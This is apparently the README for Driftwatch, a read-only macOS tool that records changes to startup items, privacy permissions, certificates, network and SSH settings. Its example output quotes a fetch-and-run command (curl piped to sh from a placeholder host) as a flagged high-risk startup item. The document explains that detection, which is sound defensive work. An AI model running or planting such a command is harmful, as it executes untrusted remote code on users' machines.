<p align="center">
  <img src="assets/logo/icon-1024.png" width="128" alt="Driftwatch icon">
</p>

<h1 align="center">Driftwatch</h1>

<p align="center">See what changed on your Mac without you knowing.</p>

Apps quietly add things to your Mac: helpers that start at login, permissions to your camera or files, certificates, network settings. Driftwatch scans these places, keeps a history, and shows you what was added, changed or removed since the last scan, so nothing changes silently.

<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="docs/screenshots/timeline-dark.png">
    <img src="docs/screenshots/timeline-light.png" width="700" alt="The Driftwatch window. A sidebar lists the areas it watches. The timeline shows the latest scan first: a new startup item, com.example.updater, marked High risk because it downloads code from the internet and runs it; Zoom getting camera access; a new certificate; a Google Chrome update. An older scan below lists two new startup items and a changed SSH settings file.">
  </picture>
  <br>
  <sub>Example data, not a real Mac.</sub>
</p>

It runs in the menu bar and in a timeline window. Everything stays on your Mac: no account, no network calls.

## What it tells you

Each change gets a short title, one plain sentence about what it is, a risk hint with the reason, and who probably added it. For the item at the top of the screenshot:

> **com.example.updater** (added, Startup items)
>
> Starts a program every time you log in. It runs: `/bin/sh -c curl -fsSL https://example.invalid/u.sh | sh`
>
> **High risk:** Downloads code from the internet and runs it straight away, a common malware trick.
>
> No "Added by" line: Driftwatch can't tell who made it.

The risk is a hint, not a verdict. "Added by" comes from a code signature when there is one; when Driftwatch only guesses from a name or folder, it says "likely". Select a change to see all its details and, for a changed item, what changed.

## What it watches

| Area | What it looks at |
|---|---|
| Startup items | Launch agents and daemons, login and background items, cron jobs, shell startup files |
| System extensions | Installed system extensions |
| Privacy permissions | Which apps can use your camera, microphone, files, screen and more (needs Full Disk Access) |
| Certificates | Certificates in your login and System keychains and their trust settings |
| Network | `/etc/hosts`, DNS resolvers |
| SSH | `authorized_keys`, SSH config, public keys, and which private keys exist (their contents are never read) |
| Apps | Code signatures of apps in `/Applications` and `~/Applications` |

Driftwatch only reads. It never deletes or changes anything on its own.

## Status

Early, v0.1. The scanner, history, the menu bar app, and plain-language explanations with risk hints for each item work. You can download it as a DMG. Still to come:

- Turning off a startup item, with a way to bring it back
- Alerts for new risky items, before/after an install, a trusted baseline, a weekly digest, export

## Install

Download `Driftwatch_aarch64.dmg` from [Releases](https://github.com/jelwingeuan/Driftwatch/releases). It is for Apple silicon Macs with macOS 14 or later. On an Intel Mac, build from source.

Open the DMG and drag Driftwatch to Applications.

The app is signed ad hoc and not notarized, so macOS blocks the first launch once. To open it, go to System Settings › Privacy & Security and click Open Anyway. Or run:

```bash
xattr -dr com.apple.quarantine /Applications/Driftwatch.app
```

To see privacy permissions, also give it [Full Disk Access](#full-disk-access).

## Build from source

Needs macOS 14 or later, Rust (`cargo`) and Xcode command line tools (`swift`).

```bash
git clone https://github.com/jelwingeuan/Driftwatch.git
cd Driftwatch
scripts/build-app.sh
open build/Driftwatch.app
```

The script builds the Rust scanner and the SwiftUI app, puts both in `build/Driftwatch.app`, and signs it ad hoc.

To regenerate the README screenshots from the example data in `docs/screenshots/demo-history.json`:

```bash
scripts/build-app.sh && scripts/screenshots.sh
```

It runs a separate copy of the app with a stub scanner that only prints the example data, so your own history and settings are not touched.

### Full Disk Access

Privacy permissions live in a protected database. To see them, add Driftwatch in System Settings › Privacy & Security › Full Disk Access. Without it, everything else still works and that area shows as unreadable.

## Command line

The scanner also works on its own:

```bash
cargo run --release -- scan          # scan and print what changed since the last scan
cargo run --release -- scan --json   # the same, as JSON
cargo run --release -- scan --skip btm   # leave out an area (here login & background items, which ask for your password)
cargo run --release -- history --json --limit 20
```

History is stored in `~/Library/Application Support/Driftwatch/driftwatch.db`.

## How it's built

- `core/`: Rust. One collector per area, a diff of each scan against the last, and a SQLite store.
- `app/`: SwiftUI menu bar app and window. It runs the bundled scanner and reads its JSON.
- `docs/`: the [prior-art check](docs/prior-art.md) and the [v1 plan](docs/plan.md).

## License

MIT, see [LICENSE](LICENSE).
